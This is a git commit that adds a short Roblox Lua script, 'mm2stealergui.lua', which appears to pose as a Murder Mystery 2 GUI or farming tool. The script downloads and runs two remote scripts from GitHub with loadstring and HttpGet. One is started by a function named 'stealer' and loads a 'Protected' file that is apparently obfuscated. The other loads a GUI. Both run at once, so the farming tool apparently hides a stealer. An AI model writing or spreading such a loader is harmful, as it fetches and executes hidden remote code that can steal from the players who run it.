00502a6bef1ad1daf027fc89a328d54a87309060
AdoptMeFan123 <sharkbloxfanclub@gmail.com>
2025-05-12 13:40:21 +0800

    Add files via upload

---
+++ mm2stealergui.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMeFan123/mm2OPGUI/refs/heads/main/Protected_7540125374038672.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMeFan123/mm2OPGUI/refs/heads/main/gui.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
